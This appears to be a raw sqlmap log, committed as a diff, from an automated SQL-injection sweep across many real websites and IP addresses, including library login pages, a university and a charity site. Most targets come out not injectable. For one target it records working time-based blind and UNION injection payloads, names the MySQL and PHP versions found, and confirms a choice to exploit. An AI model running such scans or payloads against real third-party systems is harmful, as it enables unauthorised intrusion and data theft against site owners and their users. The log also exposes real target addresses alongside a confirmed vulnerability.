+GET http://139.196.241.199//Content/css?v=m8KdMFOCcNeZrATLbCQ_9gxex1_Ma7rE5iJzJXojUIk1
+do you want to test this URL? [Y/n/q]
+> Y
+[11:25:50] [INFO] testing URL 'http://139.196.241.199//Content/css?v=m8KdMFOCcNeZrATLbCQ_9gxex1_Ma7rE5iJzJXojUIk1'
+[11:25:50] [INFO] testing connection to the target URL
+[11:25:52] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:25:52] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:25:54] [INFO] testing if the target URL is stable
+[11:25:56] [INFO] target URL is stable
+[11:25:56] [INFO] testing if GET parameter 'v' is dynamic
+[11:25:58] [WARNING] GET parameter 'v' does not appear dynamic
+[11:26:00] [WARNING] heuristic (basic) test shows that GET parameter 'v' might not be injectable
+[11:26:00] [CRITICAL] unable to connect to the target URL or proxy. sqlmap is going to retry the request(s)
+[11:26:00] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')
+[11:34:10] [INFO] skipping GET parameter 'v'
+[11:34:10] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 24:
+GET http://130.225.58.84/telearc///telearc/?ac_adm=Help
+do you want to test this URL? [Y/n/q]
+> Y
+[11:34:10] [INFO] testing URL 'http://130.225.58.84/telearc///telearc/?ac_adm=Help'
+[11:34:10] [INFO] testing connection to the target URL
+[11:34:11] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:34:11] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:34:11] [INFO] testing if the target URL is stable
+[11:34:12] [INFO] target URL is stable
+[11:34:12] [INFO] testing if GET parameter 'ac_adm' is dynamic
+[11:34:12] [INFO] heuristics detected web page charset 'ascii'
+[11:34:12] [INFO] confirming that GET parameter 'ac_adm' is dynamic
+[11:34:12] [INFO] GET parameter 'ac_adm' is dynamic
+[11:34:13] [WARNING] heuristic (basic) test shows that GET parameter 'ac_adm' might not be injectable
+[11:34:13] [INFO] skipping GET parameter 'ac_adm'
+[11:34:13] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+[11:34:13] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 2 times
+URL 25:
+GET https://chcidraky.cz///accounts/login/?next=/
+do you want to test this URL? [Y/n/q]
+> Y
+[11:34:13] [INFO] testing URL 'https://chcidraky.cz///accounts/login/?next=/'
+[11:34:14] [INFO] testing connection to the target URL
+[11:34:15] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:34:17] [INFO] testing if the target URL is stable
+[11:34:18] [INFO] target URL is stable
+[11:34:18] [INFO] testing if GET parameter 'next' is dynamic
+[11:34:20] [WARNING] GET parameter 'next' does not appear dynamic
+[11:34:24] [WARNING] heuristic (basic) test shows that GET parameter 'next' might not be injectable
+[11:34:26] [INFO] skipping GET parameter 'next'
+[11:34:26] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 26:
+GET https://bibliotek.htk.dk///wayf/login?idp=nemlogin&destination=ding_frontpage
+do you want to test this URL? [Y/n/q]
+> Y
+[11:34:26] [INFO] testing URL 'https://bibliotek.htk.dk///wayf/login?idp=nemlogin&destination=ding_frontpage'
+[11:34:26] [INFO] testing connection to the target URL
+sqlmap got a 302 redirect to 'https://bibliotek.dk/gatewayf/gatewayf.php?returnUrl=https://bibliotek.htk.dk/wayf/login&idp=nemlogin'. Do you want to follow? [Y/n] Y
+[11:34:38] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:34:46] [INFO] testing if the target URL is stable
+[11:34:54] [WARNING] GET parameter 'idp' does not appear dynamic
+[11:34:58] [WARNING] heuristic (basic) test shows that GET parameter 'idp' might not be injectable
+[11:35:08] [INFO] skipping GET parameter 'idp'
+[11:35:08] [WARNING] GET parameter 'destination' does not appear dynamic
+[11:35:16] [WARNING] heuristic (basic) test shows that GET parameter 'destination' might not be injectable
+[11:35:24] [INFO] skipping GET parameter 'destination'
+[11:35:24] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 27:
+GET http://131.0.144.4:1881/index.php?homepage=http%3A%2F%2F131.0.147.136%2F/?console=panel
+do you want to test this URL? [Y/n/q]
+> Y
+[11:35:24] [INFO] testing URL 'http://131.0.144.4:1881/index.php?homepage=http%3A%2F%2F131.0.147.136%2F/?console=panel'
+[11:35:24] [INFO] testing connection to the target URL
+[11:35:25] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:35:26] [INFO] testing if the target URL is stable
+[11:35:26] [INFO] target URL is stable
+[11:35:26] [INFO] testing if GET parameter 'homepage' is dynamic
+[11:35:27] [WARNING] GET parameter 'homepage' does not appear dynamic
+[11:35:27] [WARNING] heuristic (basic) test shows that GET parameter 'homepage' might not be injectable
+[11:35:28] [INFO] skipping GET parameter 'homepage'
+[11:35:28] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 28:
+GET http://195.230.27.241//user/login?destination=node
+do you want to test this URL? [Y/n/q]
+> Y
+[11:35:28] [INFO] testing URL 'http://195.230.27.241//user/login?destination=node'
+[11:35:28] [INFO] testing connection to the target URL
+[11:35:28] [CRITICAL] page not found (404)
+[11:35:28] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+URL 29:
+GET http://195.230.27.254//user/login?destination=node
+do you want to test this URL? [Y/n/q]
+> Y
+[11:35:28] [INFO] testing URL 'http://195.230.27.254//user/login?destination=node'
+[11:35:28] [INFO] testing connection to the target URL
+[11:35:29] [CRITICAL] page not found (404)
+[11:35:29] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+URL 30:
+GET http://202.93.8.34/?lan=kh
+do you want to test this URL? [Y/n/q]
+> Y
+[11:35:29] [INFO] testing URL 'http://202.93.8.34/?lan=kh'
+[11:35:29] [INFO] testing connection to the target URL
+[11:35:31] [INFO] heuristics detected web page charset 'ISO-8859-2'
+[11:35:32] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:35:32] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:35:35] [INFO] testing if the target URL is stable
+[11:35:37] [INFO] target URL is stable
+[11:35:37] [INFO] testing if GET parameter 'lan' is dynamic
+[11:35:40] [INFO] confirming that GET parameter 'lan' is dynamic
+[11:35:42] [INFO] GET parameter 'lan' is dynamic
+[11:35:43] [INFO] heuristics detected web page charset 'utf-8'
+[11:35:43] [WARNING] heuristic (basic) test shows that GET parameter 'lan' might not be injectable
+[11:35:45] [INFO] skipping GET parameter 'lan'
+[11:35:45] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 31:
+GET http://andrewzettler.com//?page_id=15
+do you want to test this URL? [Y/n/q]
+> Y
+[11:35:45] [INFO] testing URL 'http://andrewzettler.com//?page_id=15'
+[11:35:45] [INFO] testing connection to the target URL
+sqlmap got a 301 redirect to 'http://andrewzettler.com/contact/'. Do you want to follow? [Y/n] Y
+[11:35:47] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:35:47] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:35:49] [WARNING] reflective value(s) found and filtering out
+[11:35:50] [INFO] testing if the target URL is stable
+[11:35:52] [WARNING] GET parameter 'page_id' does not appear dynamic
+[11:35:54] [WARNING] heuristic (basic) test shows that GET parameter 'page_id' might not be injectable
+[11:35:56] [INFO] skipping GET parameter 'page_id'
+[11:35:56] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 32:
+GET http://216.234.190.2/?order=last_modified
+do you want to test this URL? [Y/n/q]
+> Y
+[11:35:56] [INFO] testing URL 'http://216.234.190.2/?order=last_modified'
+[11:35:56] [INFO] testing connection to the target URL
+[11:35:58] [INFO] heuristics detected web page charset 'ascii'
+[11:35:58] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:35:58] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:35:59] [INFO] testing if the target URL is stable
+[11:36:00] [INFO] target URL is stable
+[11:36:00] [INFO] testing if GET parameter 'order' is dynamic
+[11:36:01] [WARNING] GET parameter 'order' does not appear dynamic
+[11:36:02] [WARNING] heuristic (basic) test shows that GET parameter 'order' might not be injectable
+[11:36:02] [INFO] skipping GET parameter 'order'
+[11:36:02] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 33:
+GET http://110.50.223.81//search/?mode=results&pref_cd[]=01
+do you want to test this URL? [Y/n/q]
+> Y
+[11:36:02] [INFO] testing URL 'http://110.50.223.81//search/?mode=results&pref_cd[]=01'
+[11:36:02] [INFO] testing connection to the target URL
+[11:36:04] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:36:04] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:36:05] [INFO] testing if the target URL is stable
+[11:36:06] [INFO] target URL is stable
+[11:36:06] [INFO] testing if GET parameter 'mode' is dynamic
+[11:36:07] [INFO] confirming that GET parameter 'mode' is dynamic
+[11:36:07] [INFO] GET parameter 'mode' is dynamic
+[11:36:07] [WARNING] heuristic (basic) test shows that GET parameter 'mode' might not be injectable
+[11:36:08] [INFO] skipping GET parameter 'mode'
+[11:36:08] [INFO] testing if GET parameter 'pref_cd[]' is dynamic
+[11:36:08] [INFO] confirming that GET parameter 'pref_cd[]' is dynamic
+[11:36:09] [INFO] GET parameter 'pref_cd[]' is dynamic
+[11:36:12] [WARNING] reflective value(s) found and filtering out
+[11:36:12] [INFO] heuristic (basic) test shows that GET parameter 'pref_cd[]' might be injectable
+[11:36:13] [INFO] heuristic (XSS) test shows that GET parameter 'pref_cd[]' might be vulnerable to cross-site scripting attacks
+[11:36:13] [INFO] testing for SQL injection on GET parameter 'pref_cd[]'
+[11:36:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[11:36:31] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
+[11:36:33] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[11:36:41] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[11:36:48] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'
+[11:36:55] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[11:37:02] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'
+[11:37:04] [INFO] testing 'MySQL inline queries'
+[11:37:05] [INFO] testing 'PostgreSQL inline queries'
+[11:37:06] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[11:37:08] [INFO] testing 'MySQL > 5.0.11 stacked queries (SLEEP - comment)'
+[11:37:13] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[11:37:19] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[11:37:25] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[11:37:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[11:37:43] [INFO] GET parameter 'pref_cd[]' seems to be 'MySQL >= 5.0.12 AND time-based blind (SLEEP)' injectable 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[11:37:43] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[11:37:43] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[11:38:14] [INFO] target URL appears to be UNION injectable with 2 columns
+[11:38:17] [INFO] GET parameter 'pref_cd[]' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'pref_cd[]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 89 HTTP(s) requests:
+---
+Parameter: pref_cd[] (GET)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: mode=results&pref_cd[]=01 AND (SELECT * FROM (SELECT(SLEEP(5)))dQyp)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: mode=results&pref_cd[]=01 UNION ALL SELECT NULL,CONCAT(0x7171717071,0x73447459626a545879487368634542624b5647636a7159774d645946594c454d695a716458796461,0x716b716b71)-- sskW
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[11:38:19] [INFO] the back-end DBMS is MySQL
+web application technology: Apache, PHP 5.2.17
+back-end DBMS: MySQL 5.0.12
+[11:38:19] [ERROR] invalid target URL, skipping to the next URL
+[11:38:19] [INFO] skipping 'http://controle.redeinfo.net.br:1881/index.php?homepage=http%3A%2F%2F131.0.147.69%2F/?console=panel'
+URL 34:
+GET http://195.10.109.171//?page_id=51
+do you want to test this URL? [Y/n/q]
+> Y
+[11:38:19] [INFO] testing URL 'http://195.10.109.171//?page_id=51'
+[11:38:19] [INFO] testing connection to the target URL
+[11:38:22] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:38:22] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:38:24] [INFO] testing if the target URL is stable
+[11:38:26] [INFO] target URL is stable
+[11:38:26] [INFO] testing if GET parameter 'page_id' is dynamic
+sqlmap got a 301 redirect to 'http://195.10.109.171/?page_id=7713'. Do you want to follow? [Y/n] Y
+[11:38:28] [INFO] confirming that GET parameter 'page_id' is dynamic
+[11:38:31] [INFO] GET parameter 'page_id' is dynamic
+[11:38:37] [ERROR] possible integer casting detected (e.g. "$page_id=intval($_REQUEST['page_id'])") at the back-end web application
+do you want to skip those kind of cases (and save scanning time)? [Y/n] Y
+[11:38:39] [INFO] skipping GET parameter 'page_id'
+[11:38:39] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 35:
+GET http://103.254.12.149/?route=common/home
+do you want to test this URL? [Y/n/q]
+> Y
+[11:38:39] [INFO] testing URL 'http://103.254.12.149/?route=common/home'
+[11:38:39] [INFO] testing connection to the target URL
+[11:38:42] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:38:42] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:38:48] [INFO] testing if the target URL is stable
+[11:38:51] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:38:52] [INFO] testing if GET parameter 'route' is dynamic
+[11:39:02] [WARNING] connection timed out while trying to get error page information (404)
+[11:39:02] [INFO] confirming that GET parameter 'route' is dynamic
+[11:39:07] [INFO] GET parameter 'route' is dynamic
+[11:39:08] [WARNING] heuristic (basic) test shows that GET parameter 'route' might not be injectable
+[11:39:10] [INFO] skipping GET parameter 'route'
+[11:39:10] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+[11:39:10] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 3 times
+URL 36:
+GET http://www.adoptionhelp.org/adoption-information-packet?type=bp
+do you want to test this URL? [Y/n/q]
+> Y
+[11:39:10] [INFO] testing URL 'http://www.adoptionhelp.org/adoption-information-packet?type=bp'
+[11:39:10] [INFO] testing connection to the target URL
+[11:39:11] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:39:13] [WARNING] reflective value(s) found and filtering out
+[11:39:13] [INFO] testing if the target URL is stable
+[11:39:13] [ERROR] detected invalid data for declared content encoding 'gzip' ('size too large')
+[11:39:13] [WARNING] turning off page compression
+[11:39:13] [CRITICAL] unable to connect to the target URL or proxy. sqlmap is going to retry the request(s)
+[11:39:13] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')
+[11:39:15] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:39:15] [INFO] testing if GET parameter 'type' is dynamic
+[11:39:16] [WARNING] GET parameter 'type' does not appear dynamic
+[11:39:17] [WARNING] heuristic (basic) test shows that GET parameter 'type' might not be injectable
+[11:39:20] [INFO] skipping GET parameter 'type'
+[11:39:20] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 37:
+GET http://104.154.39.230//homepage?tmpl=component&print=1&page=
+do you want to test this URL? [Y/n/q]
+> Y
+[11:39:20] [INFO] testing URL 'http://104.154.39.230//homepage?tmpl=component&print=1&page='
+[11:39:20] [INFO] testing connection to the target URL
+[11:39:21] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:39:21] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
+[11:39:21] [INFO] testing if the target URL is stable
+[11:39:22] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:39:22] [INFO] searching for dynamic content
+[11:39:22] [INFO] dynamic content marked for removal (1 region)
+[11:39:22] [INFO] testing if GET parameter 'tmpl' is dynamic
+[11:39:22] [INFO] confirming that GET parameter 'tmpl' is dynamic
+[11:39:23] [INFO] GET parameter 'tmpl' is dynamic
+[11:39:23] [WARNING] heuristic (basic) test shows that GET parameter 'tmpl' might not be injectable
+[11:39:23] [INFO] skipping GET parameter 'tmpl'
+[11:39:23] [INFO] testing if GET parameter 'print' is dynamic
+[11:39:23] [WARNING] GET parameter 'print' does not appear dynamic
+[11:39:24] [WARNING] heuristic (basic) test shows that GET parameter 'print' might not be injectable
+[11:39:24] [INFO] skipping GET parameter 'print'
+[11:39:24] [INFO] testing if GET parameter 'page' is dynamic
+[11:39:24] [WARNING] GET parameter 'page' does not appear dynamic
+[11:39:25] [WARNING] heuristic (basic) test shows that GET parameter 'page' might not be injectable
+[11:39:25] [INFO] skipping GET parameter 'page'
+[11:39:25] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. You can give it a go with the switch '--text-only' if the target page has a low percentage of textual content (~17.70% of page content is text). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+[11:39:25] [WARNING] HTTP error codes detected during run:
+403 (Forbidden) - 1 times
+URL 38:
+GET http://84.88.82.102//advanced?action=index&controller=catalog
+do you want to test this URL? [Y/n/q]
+> Y
+[11:39:25] [INFO] testing URL 'http://84.88.82.102//advanced?action=index&controller=catalog'
+[11:39:25] [INFO] testing connection to the target URL
+[11:39:26] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+[11:39:26] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:39:27] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
+[11:39:27] [INFO] testing if the target URL is stable
+[11:39:27] [INFO] target URL is stable
+[11:39:27] [INFO] testing if GET parameter 'action' is dynamic
+[11:39:27] [WARNING] GET parameter 'action' does not appear dynamic
+[11:39:28] [WARNING] heuristic (basic) test shows that GET parameter 'action' might not be injectable
+[11:39:28] [INFO] skipping GET parameter 'action'
+[11:39:28] [INFO] testing if GET parameter 'controller' is dynamic
+[11:39:28] [WARNING] GET parameter 'controller' does not appear dynamic
+[11:39:29] [WARNING] heuristic (basic) test shows that GET parameter 'controller' might not be injectable
+[11:39:29] [INFO] skipping GET parameter 'controller'
+[11:39:29] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+[11:39:29] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 8 times
+URL 39:
+GET http://180.235.238.213/campaign/?cat=3
+do you want to test this URL? [Y/n/q]
+> Y
+[11:39:29] [INFO] testing URL 'http://180.235.238.213/campaign/?cat=3'
+[11:39:29] [INFO] testing connection to the target URL
+[11:39:33] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:39:34] [INFO] testing if the target URL is stable
+[11:39:36] [INFO] target URL is stable
+[11:39:36] [INFO] testing if GET parameter 'cat' is dynamic
+[11:39:37] [INFO] confirming that GET parameter 'cat' is dynamic
+[11:39:38] [WARNING] GET parameter 'cat' does not appear dynamic
+[11:39:39] [WARNING] heuristic (basic) test shows that GET parameter 'cat' might not be injectable
+[11:39:41] [INFO] skipping GET parameter 'cat'
+[11:39:41] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+[11:39:41] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 2 times
+URL 40:
+GET http://212.227.249.14/?page_id=6
+do you want to test this URL? [Y/n/q]
+> Y
+[11:39:41] [INFO] testing URL 'http://212.227.249.14/?page_id=6'
+[11:39:41] [INFO] testing connection to the target URL
+[11:39:44] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:39:47] [INFO] testing if the target URL is stable
+[11:39:49] [INFO] target URL is stable
+[11:39:49] [INFO] testing if GET parameter 'page_id' is dynamic
+[11:39:52] [INFO] confirming that GET parameter 'page_id' is dynamic
+[11:39:55] [WARNING] GET parameter 'page_id' does not appear dynamic
+[11:39:57] [WARNING] heuristic (basic) test shows that GET parameter 'page_id' might not be injectable
+[11:40:00] [INFO] skipping GET parameter 'page_id'
+[11:40:00] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+[11:40:00] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 2 times
+URL 41:
+GET http://webturisin.hokkaido-np.co.jp/turisin///store/obligation/?store=13
+do you want to test this URL? [Y/n/q]
+> Y
+[11:40:00] [INFO] testing URL 'http://webturisin.hokkaido-np.co.jp/turisin///store/obligation/?store=13'
+[11:40:00] [INFO] testing connection to the target URL
+[11:40:01] [CRITICAL] page not found (404)
+[11:40:01] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+URL 42:
+GET http://195.230.28.37//user/login?destination=node
+do you want to test this URL? [Y/n/q]
+> Y
+[11:40:01] [INFO] testing URL 'http://195.230.28.37//user/login?destination=node'
+[11:40:01] [INFO] testing connection to the target URL
+[11:40:01] [CRITICAL] page not found (404)
+[11:40:01] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+URL 43:
+GET http://195.230.27.127//user/login?destination=node
+do you want to test this URL? [Y/n/q]
+> Y
+[11:40:01] [INFO] testing URL 'http://195.230.27.127//user/login?destination=node'
+[11:40:01] [INFO] testing connection to the target URL
+[11:40:02] [CRITICAL] page not found (404)
+[11:40:02] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+URL 44:
+GET http://www.du.se/sv/Student/Alumni///sv/Om-Hogskolan/Aktuellt/Nyheter/?categoryid=82
+do you want to test this URL? [Y/n/q]
+> Y
+[11:40:02] [INFO] testing URL 'http://www.du.se/sv/Student/Alumni///sv/Om-Hogskolan/Aktuellt/Nyheter/?categoryid=82'
+[11:40:03] [INFO] testing connection to the target URL
+[11:40:05] [CRITICAL] page not found (404)
+[11:40:05] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+URL 45:
+GET http://128.113.106.180/xmlui///xmlui/browse?type=dateissued
+do you want to test this URL? [Y/n/q]
+> Y
+[11:40:05] [INFO] testing URL 'http://128.113.106.180/xmlui///xmlui/browse?type=dateissued'
+[11:40:05] [INFO] testing connection to the target URL
+[11:40:05] [CRITICAL] page not found (404)
+[11:40:05] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+URL 46:
+GET http://177.124.164.10:1881/index.php?homepage=http%3A%2F%2F177.124.167.234%2F/?console=panel
+do you want to test this URL? [Y/n/q]
+> Y
+[11:40:05] [INFO] testing URL 'http://177.124.164.10:1881/index.php?homepage=http%3A%2F%2F177.124.167.234%2F/?console=panel'
+[11:40:05] [INFO] testing connection to the target URL
+[11:40:06] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:40:06] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:40:07] [WARNING] reflective value(s) found and filtering out
+[11:40:07] [INFO] testing if the target URL is stable
+[11:40:07] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:40:07] [INFO] testing if GET parameter 'homepage' is dynamic
+[11:40:08] [WARNING] GET parameter 'homepage' does not appear dynamic
+[11:40:08] [WARNING] heuristic (basic) test shows that GET parameter 'homepage' might not be injectable
+[11:40:08] [INFO] skipping GET parameter 'homepage'
+[11:40:08] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 47:
+GET http://54.205.226.59//daily?woeid=0
+do you want to test this URL? [Y/n/q]
+> Y
+[11:40:08] [INFO] testing URL 'http://54.205.226.59//daily?woeid=0'
+[11:40:08] [INFO] testing connection to the target URL
+[11:40:14] [CRITICAL] page not found (404)
+[11:40:14] [WARNING] HTTP error codes detected during run:
